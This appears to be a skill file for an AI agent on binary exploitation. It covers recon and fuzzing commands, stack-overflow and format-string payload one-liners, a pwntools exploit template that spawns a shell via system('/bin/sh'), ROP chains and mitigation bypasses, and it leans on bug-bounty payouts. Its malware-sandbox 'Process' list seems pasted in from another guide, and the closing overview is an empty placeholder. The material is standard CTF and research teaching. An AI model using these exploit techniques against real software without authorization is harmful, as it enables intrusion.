---
name: binary-breaker
description: Binary exploitation and reverse engineering for finding zero-days in compiled software. Use when analyzing binaries,
  finding memory corruption bugs, reverse engineering firmware, or hunting bugs in C/C++ applications.
domain: cybersecurity
tags:
- binary
- breaker
- cybersecurity
- security
- threat-defense
---

# Binary Breaker

Binary exploitation is the apex predator skill. Finding memory corruption in compiled software = zero-days = $50k-$500k payouts. Most bug hunters can't do this — that's your edge.

## When to Use

- Hunting zero-days in desktop applications
- Firmware reverse engineering
- Analyzing C/C++ applications for memory bugs
- Exploiting buffer overflows, use-after-free, format strings
- Vulnerability research in closed-source software
- CTF pwn challenges

## The Process

1. **Isolate the sample** — ensure the malware is in a sandboxed environment with no network access
2. **Record file metadata** — hash the sample and note file type, size, and compile timestamp
3. **Static analysis** — examine strings, imports, and disassembled code without execution
4. **Dynamic analysis** — execute in a monitored sandbox and record behavior (file, registry, network)
5. **Document IOCs** — extract indicators of compromise and write the analysis report
### 1. Binary Reconnaissance

```bash
# File type and protections
file binary
checksec binary  # or checksec --file=binary
rabin2 -I binary  # radare2

# Protections to note:
# NX (No-Execute) - stack not executable
# ASLR - address space layout randomization
# PIE - position independent executable
# Stack Canary - stack buffer overflow detection
# RELRO - GOT overwrite protection

# Strings analysis
strings binary | grep -i "password\|key\|token\|admin\|root\|flag"
strings -n 10 binary  # longer strings only

# Import/export analysis
rabin2 -i binary  # imports
rabin2 -E binary  # exports
```

### 2. Static Analysis

```bash
# Disassembly
objdump -d binary
r2 -A binary  # radare2 with analysis
ghidra binary  # Ghidra (best free decompiler)
ida binary  # IDA Pro (industry standard)

# Key patterns to find:
# strcpy, strcat, sprintf (buffer overflow)
# malloc/free pairs (use-after-free)
# printf with user input (format string)
# system(), exec() (command injection)
# gets() (guaranteed overflow)
```

### 3. Dynamic Analysis

```bash
# Debugging
gdb ./binary
gef  # GDB Enhanced Features
pwndbg  # Alternative GDB plugin

# Tracing
strace ./binary  # syscalls
ltrace ./binary  # library calls

# Fuzzing
afl-fuzz -i input -o output -- ./binary @@
honggfuzz -i input -- ./binary ___
```

### 4. Common Vulnerability Classes

#### Stack Buffer Overflow
```c
// Vulnerable:
void vulnerable() {
    char buf[64];
    gets(buf);  // No bounds check
}

// Exploitation:
// 1. Find offset to return address (cyclic pattern)
# cyclic 100
# Run with pattern, check crash address
# cyclic -l <crash_address>

// 2. Overwrite return address with shellcode/ROP chain
python3 -c "print('A'*72 + '\x48\x31\xff...')"
```

#### Heap Exploitation
```c
// Use-After-Free
char *p = malloc(32);
free(p);
// p still points to freed memory
// If another allocation reuses that chunk:
char *q = malloc(32);
// Now p and q point to same memory
// Writing through p corrupts q's data

// Double Free
free(p);
free(p);  // Same chunk freed twice
// Can corrupt heap metadata
```

#### Format String
```c
// Vulnerable:
printf(user_input);  // User controls format string

// Exploitation:
# Read stack values
%s%s%s%s%s%s%s
# Read specific address
%7$s  # 7th argument as string

# Write to arbitrary address
# %n writes number of bytes printed to address
# %hn writes 2 bytes, %hhn writes 1 byte

# Example: overwrite GOT entry
python3 -c "print('\x08\x04\xa0\x00' + '%x.'*6 + '%n')"
```

### 5. ROP (Return-Oriented Programming)

```bash
# Find ROP gadgets
ROPgadget --binary ./binary
ropper -f ./binary
rabin2 -R binary  # radare2

# Common gadgets:
# pop rdi; ret  (set first argument)
# pop rsi; ret  (set second argument)
# pop rdx; ret  (set third argument)
# syscall; ret  (make syscall)
# leave; ret    (stack pivot)

# Build ROP chain for system("/bin/sh"):
# 1. pop rdi; ret  → address of "/bin/sh"
# 2. address of system()
```

### 6. Exploit Development

```python
# pwntools template
from pwn import *

# Setup
p = process('./binary')
# p = remote('target.com', 1337)
elf = ELF('./binary')

# Leak addresses
p.recvuntil(b'Address: ')
leak = int(p.recvline(), 16)
libc_base = leak - libc.symbols['printf']

# Build payload
payload = b'A' * offset
payload += p64(rop_gadget)
payload += p64(libc_base + libc.symbols['system'])
payload += p64(libc_base + next(libc.search(b'/bin/sh')))

# Send exploit
p.sendline(payload)
p.interactive()
```

### 7. Firmware Analysis

```bash
# Extract firmware
binwalk -e firmware.bin
firmwalker extracted/

# Look for:
# Hardcoded credentials
# Private keys
# Debug interfaces
# Command injection points
# Buffer overflows in web interface

# Emulate firmware
qemu-system-arm -M versatilepb -kernel extracted/zImage
qemu-system-mips -M malta -kernel extracted/vmlinux

# UART/serial access
screen /dev/ttyUSB0 115200
```

### 8. Exploit Mitigation Bypass

```
# ASLR bypass:
# Information leak to find base address
# Partial overwrite (only change lower bytes)
# Brute force (32-bit, limited entropy)

# NX bypass:
# ROP chain to call mprotect/mmap
# Return to libc (system, execve)
# Return-to-plt

# Stack canary bypass:
# Leak canary via format string/info disclosure
# Overwrite canary with known value
# Brute force byte-by-byte (forking server)

# PIE bypass:
# Leak PIE base via info disclosure
# Partial overwrite
# Combine with ASLR bypass
```

## When NOT to Use

- Task is outside your authorization scope
- You need to implement controls (use implementing-* skills)
- Task is about analysis, not action (use analyzing-* skills)
- You don't have access to target systems
- Task requires compliance expertise (consult professionals)
- Task is about defense, not offense (use defensive skills)


## Red Flags

- Exploiting systems without authorization
- Developing exploits for malicious use
- Sharing zero-days without responsible disclosure
- Causing denial of service during testing
- Not cleaning up exploitation artifacts

## Verification

- Exploit works reliably (not just once)
- Crash is reproducible from clean state
- Root cause identified (not just "it crashes")
- Exploit demonstrates actual impact (RCE, privesc)
- Responsible disclosure plan in place

## Revenue Potential

| Target | Bug Type | Payout Range |
|--------|----------|--------------|
| Browser (Chrome/Safari) | Renderer RCE | $50,000-$250,000 |
| OS Kernel | Privilege Escalation | $50,000-$500,000 |
| Popular Desktop App | Memory Corruption | $10,000-$100,000 |
| Embedded/Firmware | Buffer Overflow | $5,000-$50,000 |
| Server Software | RCE | $10,000-$100,000 |
| Mobile (Android/iOS) | Kernel/Libc Bug | $50,000-$250,000 |

## Tools

| Purpose | Tools |
|---------|-------|
| Disassembly | Ghidra, IDA Pro, Binary Ninja |
| Debugging | GDB+GEF/pwndbg, x64dbg, WinDbg |
| Exploitation | pwntools, ROPgadget, ropper |
| Fuzzing | AFL++, honggfuzz, libfuzzer |
| Firmware | binwalk, firmwalker, FACT |
| Emulation | QEMU, Unicorn |

## Practice

- pwnable.kr
- pwnable.tw
- ROP Emporium
- Exploit Education (Phoenix, Protostar)
- HackTheBox (Pwn challenges)
- CTFtime.org

## Overview

> Section content — see SKILL.md body for full details.
